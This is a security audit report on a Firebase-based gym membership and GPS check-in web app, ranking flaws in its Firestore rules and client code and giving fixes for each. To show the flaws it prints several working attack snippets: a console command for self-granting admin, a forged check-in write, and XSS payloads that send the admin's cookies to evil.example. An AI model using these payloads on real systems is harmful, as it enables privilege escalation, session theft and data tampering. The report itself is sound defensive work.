# FitTrack QR Gym Manager — Security Audit Report

**Scope reviewed:** `firestore.rules`, `admin.js`, `member.js`, `firebase-config.js`, `admin.html`, `index.html`, `manifest*.json`, `sw.js`
**Audit date:** 2026-09-10

## Executive Summary

The most important thing to understand about this app's architecture is: **`firestore.rules` is the only real security boundary.** Everything in `admin.js` and `member.js` — the biometric/passkey gate, the re-auth modal, the Haversine GPS check — runs in the attacker's own browser and can be read, modified, or skipped entirely with dev tools or a raw `curl`/SDK call. If a rule doesn't enforce something, nothing enforces it.

Judged against that standard, this app has **three critical, independently-exploitable holes** that combine into full compromise:

1. Any signed-in Google account can grant **itself** admin access (rule bug).
2. Anyone, signed in or not, can write fake `checkins` directly to Firestore — the GPS check is decorative.
3. Two stored XSS vectors let an unauthenticated visitor run JavaScript in the **admin's** browser the next time they open the dashboard — which, combined with #1's rule bug, is a full account/data takeover chain that doesn't even require guessing an admin's password.

Below is the full breakdown, in the order I'd fix them.

---

## CRITICAL

### C1. Any user can self-promote to admin (`firestore.rules`, admins collection)

```js
match /admins/{email} {
  allow read, write: if request.auth != null && request.auth.token.email == email;
}
```

`write` includes `create`. This literally says: *"a signed-in user may create the admin document that matches their own email."* Combined with `isVerifiedAdmin()`:

```js
function isVerifiedAdmin() {
  return request.auth != null &&
    exists(/databases/$(database)/documents/admins/$(request.auth.token.email));
}
```

...any person can:
1. Open `admin.html`, click "Sign in with Google" with **any** Google account (their own personal Gmail — nothing restricts *which* Google accounts can sign in to your Firebase Auth project).
2. Open the browser console and run:
   ```js
   firebase.firestore().collection('admins').doc(firebase.auth().currentUser.email).set({ addedAt: Date.now() });
   ```
3. Refresh. They now pass `isVerifiedAdmin()` and have full `list/update/delete` on `members`, full CRUD on `payments`, and admin read/update/delete on `checkins`.

This is the single most important bug in the codebase — everything else (biometric lock, re-auth modal, Google-only login) is downstream of this check and means nothing once it's bypassed.

**Fix:** Client apps should never be able to write to the source of truth for "who is an admin." Deny it outright and manage admin grants out-of-band:

```js
match /admins/{email} {
  allow read: if request.auth != null && request.auth.token.email == email;
  allow write: if false; // add/remove admins only via Firebase Console or Admin SDK
}
```

Better long-term fix: move off a client-readable `admins` collection entirely and use **Firebase Auth custom claims** (`request.auth.token.admin == true`) set only by a Cloud Function you trigger manually / via a super-admin-only callable function. Custom claims can't be forged by the client no matter what Firestore rules say.

---

### C2. Check-ins can be forged directly against Firestore — GPS check is client-side theater

```js
match /checkins/{checkinId} {
  allow create: if request.resource.data.memberId is string
                && request.resource.data.dateKey is string;
  ...
}
```

No `request.auth != null`, no cross-check against a member's location, distance, or even existence. `member.js`'s entire Haversine/geofence logic (lines 200–262) is a courtesy the *legitimate* app chooses to run — it is not enforced. Anyone can open the browser console on `index.html` (no login required, it's the public portal) and run:

```js
firebase.firestore().collection('checkins').add({
  memberId: '9198XXXXXXX',   // any known/guessed phone number
  name: 'x', phone: 'x',
  dateKey: '2026-09-10',      // any past or future date
  method: 'geofenced-gps'
});
```

This works from anywhere on Earth — no GPS override, no location spoofing app needed at all, because the write path that's *supposed* to require proximity has no proximity check server-side. This also lets anyone flood the collection with unlimited documents (storage-cost DoS).

**Fix:** Stop trusting client writes to `checkins` for anything that matters:

```js
match /checkins/{checkinId} {
  allow create: if false;   // all check-ins go through a Cloud Function
  allow read, update, delete: if isVerifiedAdmin();
}
```

Move the check-in logic into a **callable Cloud Function** (Admin SDK, runs server-side, bypasses rules):
- Client sends `{ lat, lng, memberId }`.
- Function looks up the member, re-runs the Haversine calculation **server-side** against a `GYM_LOCATION` that lives only in function config (not shipped to every browser).
- Function enforces "one check-in per member per day" atomically in a transaction (the current client-side "already checked in" check is also a race condition — two rapid requests can both pass it before either write lands).
- Function writes the `checkins` doc itself.

Note this still doesn't fully solve GPS spoofing (see H1) — but it closes the much bigger hole of *skipping GPS entirely*.

---

### C3. Stored XSS via unescaped `phone` field → admin session takeover

Two separate bugs stack here:

**(a)** `firestore.rules` never validates the *shape* of `phone`:
```js
allow create: if request.resource.data.phone == phone
              && request.resource.data.paymentStatus == "pending";
```
`normalizePhone()` in `member.js` (`replace(/\D/g, "")`) is a **client-side** convenience — it does nothing to stop someone calling Firestore directly with a `phone` value containing arbitrary HTML.

**(b)** `admin.js` renders `m.phone` and `row.phone` with **no escaping at all**, inside `innerHTML`:
```js
// renderMemberTable()
<p class="text-xs text-slate-500">+${GYM_SETTINGS.defaultCountryCode} ${m.phone}</p>
// renderCheckinLog()
<span class="text-xs text-slate-500">+${GYM_SETTINGS.defaultCountryCode} ${row.phone}</span>
```

An unauthenticated attacker on the **public** registration form (`index.html`) can call Firestore directly:

```js
const evilPhone = '<img src=x onerror="fetch(`https://evil.example/x?c=`+document.cookie)">';
firebase.firestore().collection('members').doc(evilPhone).set({
  phone: evilPhone, paymentStatus: 'pending',
  name: 'Attacker', address: 'x', joinDate: '2026-09-10',
  plan: '1m', expiryDate: '2099-12-31'
});
```

The next time an admin opens `admin.html`, `renderMemberTable()` (and later `renderCheckinLog()` if this member also has a check-in) injects that markup straight into the DOM via `tbody.innerHTML = ...` and it executes **in the admin's authenticated session** — with a live Firestore SDK connection already signed in as a verified admin. From there the payload can read `document.cookie`/IndexedDB tokens, or simply issue its own Firestore writes (mark itself paid, delete other members, exfiltrate the whole `members`/`payments` collections, or — chaining with C1 — grant *other* accounts admin) without ever needing the admin's password or device.

**Fix:**
1. **Escape every interpolated field, unconditionally** — never assume a Firestore field matches what your client-side form intended it to be. Data must be treated as untrusted the moment it can reach Firestore by any path other than through your validating rules.
2. Prefer building rows with DOM APIs (`textContent`, `createElement`) instead of `innerHTML` string concatenation — this eliminates the whole bug class regardless of what gets stored.
3. If you keep the `innerHTML` template-string pattern, fix `escapeHtml` itself (see C4 — the current version is unsafe in attribute contexts and this phone bug shows it's also just not being *called*).
4. Enforce phone shape in rules (see C5) so malformed data can't even be written in the first place — defense in depth, not a substitute for #1–2.

---

### C4. `escapeHtml()` is unsafe in attribute context (secondary stored-XSS vector via `address`)

```js
function escapeHtml(str) {
  const div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
}
```

This is a well-known partial fix: setting `textContent` and reading back `innerHTML` correctly encodes `&`, `<`, `>` — but **not `"` or `'`**, because quote characters aren't meaningful inside a text node. It's safe when used as `<p>${escapeHtml(x)}</p>` but **not** when used inside a quoted HTML attribute:

```js
<td class="..." title="${escapeHtml(m.address || "")}">${escapeHtml(m.address || "—")}</td>
```

A registration with `address = foo" onmouseover="fetch('https://evil.example/'+document.cookie)` breaks out of the `title="..."` attribute and adds a live `onmouseover` handler to the `<td>` — firing the moment an admin's mouse passes over that member's row. Since `address` is submitted through the public, unauthenticated registration form, this requires no rule bypass at all — just typing a crafted string into the "Address" field.

**Fix — replace `escapeHtml` with a version that also encodes quotes:**
```js
function escapeHtml(str) {
  return String(str ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  }[c]));
}
```
This is safe in both text-node and attribute-value contexts and is a drop-in replacement — no call sites need to change.

**Also add a Content-Security-Policy** (via Firebase Hosting's `firebase.json` `headers` config) with a strict `script-src 'self' <your CDN hosts>` and no `unsafe-inline`/`unsafe-eval`. This won't fix the underlying bug, but it means a future escaping mistake like this one fails closed instead of executing arbitrary script.

---

### C5. `members` create rule doesn't constrain document shape — forged "active" memberships & unbounded writes

```js
match /members/{phone} {
  allow create: if request.resource.data.phone == phone
                && request.resource.data.paymentStatus == "pending";
  ...
}
```

Only `phone` and `paymentStatus` are checked. Everything else — `name`, `address`, `plan`, `joinDate`, and critically **`expiryDate`** — is fully attacker-controlled on create, with no auth requirement at all. Consequences:

- An attacker can set `expiryDate: "2099-12-31"` and get a permanently "ACTIVE" badge on the member status page, indefinitely, without ever paying (the check-in path doesn't check `paymentStatus` either — see H1).
- No type/length constraints → arbitrary-size blobs in `name`/`address` (storage-cost abuse), or non-string values that break downstream code expecting strings.
- No field allowlist → arbitrary extra fields can be attached to a member document.
- No rate limit on document creation at all → cheap mass-registration DoS (every write has a Firestore cost).

**Fix:**
```js
match /members/{phone} {
  allow create: if phone.matches('^[0-9]{7,15}$')
                && request.resource.data.phone == phone
                && request.resource.data.paymentStatus == "pending"
                && request.resource.data.name is string
                && request.resource.data.name.size() > 0 && request.resource.data.name.size() < 100
                && request.resource.data.address is string && request.resource.data.address.size() < 300
                && request.resource.data.plan in ["1m", "3m", "6m", "12m"]
                && request.resource.data.joinDate is string
                && request.resource.data.keys().hasOnly(
                     ["name","phone","address","joinDate","plan","expiryDate","paymentStatus","createdAt","updatedAt"]
                   );
  allow get: if true;
  allow list, update, delete: if isVerifiedAdmin();
}
```
And, more importantly: **don't trust `expiryDate` from the client at all.** Have the client omit it (or send a placeholder), and use a Cloud Function `onCreate` trigger to compute `expiryDate` server-side from `plan` + `joinDate` using your existing `addMonthsToDateKey` logic, overwriting whatever the client sent. Derived/business-critical fields should never be client-writable inputs.

---

## HIGH

### H1. Check-in isn't gated on membership status anywhere — payment/expiry logic is cosmetic

Nothing in `firestore.rules` (even after fixing C2/C5) currently ties a `checkins` write to the corresponding member's `paymentStatus` or `expiryDate`. If you build the recommended Cloud Function (C2), have it explicitly re-check `paymentStatus == "paid"` and `expiryDate >= today` before writing the check-in — otherwise a member with a lapsed or forged-pending membership can still check in forever.

### H2. GPS is inherently spoofable — moving the check server-side (C2) reduces but doesn't eliminate this

Even with a Cloud Function doing the Haversine math, the function still only knows what coordinates the client *reports*. Browser geolocation can be overridden trivially:
- Chrome DevTools → **More tools → Sensors → Location override** (no root/jailbreak needed).
- Android "mock location" apps once Developer Options → "Allow mock locations" (or a chosen mock-location app) is enabled — works against any app, including inside a real, unmodified mobile browser.
- Simplest of all: open the browser console on the page and run `navigator.geolocation.getCurrentPosition = (cb) => cb({coords:{latitude: 29.456545, longitude: 77.717185}})` before triggering check-in — no external tools required.

**Recommendation:** Treat GPS check-in as a *convenience* tier, not a security control, and add a second factor that requires physical presence:
- A QR/short code displayed on a screen at the gym that rotates periodically (e.g., every 60–120 seconds), generated and stored server-side; the check-in Cloud Function requires this code in addition to GPS. A remote attacker can't know the current code without being physically there.
- Or lean more on staff-performed "Manual Check-In" (already in `admin.js`) as the authoritative record for anything billing-related, treating self-check-in as attendance-tracking only.
- Log anomalies (e.g., check-ins with impossible travel time between two members' "locations", or the exact same lat/lng reported repeatedly across many different member IDs) for manual review.

### H3. WebAuthn/passkey flow is verified entirely client-side — provides UX friction, not cryptographic security

`handleBiometricSetup()` and `runDeviceVerification()`/`handleReauthSubmit()` create and check WebAuthn credentials purely in the browser: `if (!assertion) throw ...` / `if (!credential) throw ...`. There is **no server verifying the signed assertion against a stored public key** (which is the entire point of WebAuthn — proving possession of a private key to a relying party). As implemented, this only proves that *some* platform authenticator produced *some* response object; a page script (or anyone with console access to an already-authenticated tab) can simply call `showDashboard(auth.currentUser)` directly and skip the whole flow, or stub `navigator.credentials.get`/`create` to resolve with a fake object.

This isn't catastrophic **only because** the real authorization boundary is (supposed to be) Firestore rules via `isVerifiedAdmin()` — but the UI explicitly markets this as "STRICT SECURITY... no Skip allowed," which overstates what it delivers. If you want WebAuthn to be a real security control (e.g., for compliance or defense-in-depth against a stolen, already-logged-in laptop), you need a backend (Cloud Function) that stores the public key at registration and verifies the signed challenge/assertion server-side (libraries like `@simplewebauthn/server` handle this) — and the challenge must be a server-issued, single-use nonce, not a value generated and forgotten client-side.

### H4. Walk-up device-lock takeover on an unlocked, already-logged-in admin browser

`handleDeviceVerifyReset()` gates removing/replacing the registered biometric credential behind nothing but a `confirm()` dialog:
```js
function handleDeviceVerifyReset() {
  const user = auth.currentUser;
  if (!user) return;
  const confirmed = confirm("Reset the device lock for this browser?");
  if (!confirmed) return;
  clearStoredCredentialId(user.uid);
  showScreen("biometricSetupScreen");
}
```
Anyone with 10 seconds of physical access to an admin's unlocked, still-signed-in laptop/phone (Firebase Auth sessions persist by default) can reset the device lock and register **their own fingerprint**, gaining standing access to that admin's session going forward. Require a fresh Google re-auth popup (`signInWithPopup` again, or `reauthenticateWithPopup`) before allowing a device-lock reset, and consider `auth.setPersistence(firebase.auth.Auth.Persistence.SESSION)` plus an idle-timeout auto-sign-out for the admin app so sessions don't live indefinitely on shared/kiosk hardware.

### H5. Public member lookup leaks full PII to anyone who knows/guesses a phone number

```js
match /members/{phone} {
  allow get: if true;
  ...
}
```
This is needed for the "Check Status" feature, but it means *anyone* who has (or brute-forces) a 10-digit number gets that person's full name, address, plan, join date, expiry, and payment status — no rate limiting, no proof of ownership. Combined with no App Check (H6/M-series below), this is scriptable at scale.

**Recommendation:** Add Firebase App Check to raise the cost of automated enumeration, and/or gate the status lookup behind Firebase Phone Auth OTP so only the actual number's owner can retrieve the full record (a masked/partial response — e.g., just ACTIVE/EXPIRED and days remaining, no name/address — could remain OTP-free if you want a fully public "is this membership current" check).

### H6. No Firebase App Check — nothing distinguishes your real web app from a script/curl

Every Critical finding above (C2, C3, C5) is trivial precisely because there's nothing stopping direct, unauthenticated calls to the Firestore REST/SDK endpoints from outside your actual web page. **App Check does not replace fixing the rules** (a logged-in human using your real app in a real browser still has dev tools), but it does block the "copy-paste a script and hit the API from anywhere" style of the attacks described here, which is how most of this would actually get exploited in the wild.

**Recommendation:** Enable Firebase App Check (reCAPTCHA v3/Enterprise, or reCAPTCHA Enterprise for a "score" based system) on both Firestore and Identity Toolkit (Auth), and set enforcement to "Enforce" once verified working.

---

## MEDIUM

### M1. Firebase Web API key has no visible restriction

The API key in `firebase-config.js` being public in client-side code is **expected and fine by design** — Google's Web API keys identify a project, they don't authorize access (Security Rules do that). But it should still be restricted in **Google Cloud Console → APIs & Services → Credentials**:
- **Application restrictions:** HTTP referrers limited to your actual domain(s).
- **API restrictions:** limited to only the APIs you actually use (Identity Toolkit API, Token Service API, Cloud Firestore API) — this limits the blast radius if the key is scraped and reused for unrelated billed APIs on your Google Cloud project.

### M2. `checkins`/`members` writes have no field allowlist (`hasOnly`)

Beyond the specific fields checked in C2/C5's fixes, apply `request.resource.data.keys().hasOnly([...])` consistently across every `create`/`update` rule in the file, including `payments`, so unexpected fields can never be smuggled into documents your app doesn't currently read (defense against future logic bugs that might trust an unexpected field).

### M3. Client-side-only duplicate-registration check is a TOCTOU race

```js
const existingDoc = await membersCol.doc(phone).get();
if (existingDoc.exists) { ... return; }
...
await membersCol.doc(phone).set({...});
```
Two near-simultaneous registrations for the same phone can both pass the `.get()` check before either `.set()` lands. Low real-world impact here since Firestore's `create` semantics mean the second write would need to be an update anyway (not exploitable for privilege gain), but worth knowing this check isn't atomic.

### M4. No rate limiting / CAPTCHA on public registration or status-check forms

Since `members` `create` and (after the C2 fix, hopefully via a rate-limited Cloud Function) check-in submission are open to the internet, add reCAPTCHA (or App Check, M-series above) to the public registration form to blunt scripted bulk registration/spam.

---

## LOW

### L1. Verbose `console.log` of live GPS coordinates and distance

```js
console.log("Current User Lat/Lng:", userLat, userLng);
console.log("Distance from Gym (Meters):", Math.round(distance));
```
Minor information disclosure in the browser console (visible to anyone using that device, or via any injected script/extension) — strip these from production builds.

### L2. Real-looking gym coordinates left in comments/dead code

```js
const GYM_LOCATION = {
  lat: 29.456545, lng: 77.717185, ... // Tera ghar/testing latitude
};
/* const GYM_LOCATION = { lat: 29.456923, ... }; */
```
Commented-out dead code with what look like real-world test coordinates (and a comment suggesting a personal address) shipped in the production bundle. Not itself a vulnerability, but worth cleaning up before this file is public — anyone can view-source it.

### L3. Service worker / manifest caching of admin assets

Didn't find anything actively wrong here, but since `admin.html`/`admin.js` are served through the same PWA (`sw.js`, `manifest-admin.json`), confirm the service worker doesn't cache-first anything that should always hit the network (e.g., use network-first or no-cache for `admin.html`/`admin.js` specifically) so a stale, patched-vulnerability version can't linger on a device after you ship a fix.

---

## Priority Fix Order

1. **C1** — lock down `admins` writes (one line change, closes the biggest hole immediately).
2. **C4** — swap in the quote-safe `escapeHtml` (one function change).
3. **C3 / C5** — tighten `members` create rule (format + `hasOnly`) and start escaping/validating every field, including `phone`.
4. **C2** — move check-ins behind a Cloud Function; deny direct client `create`.
5. **H6** — turn on App Check (cheap, high leverage, protects several findings above at once).
6. Everything else, roughly in the order listed.

None of the WebAuthn/re-auth polish (H3, H4) matters much until C1 is fixed — right now it's securing a door that has another door standing wide open next to it.
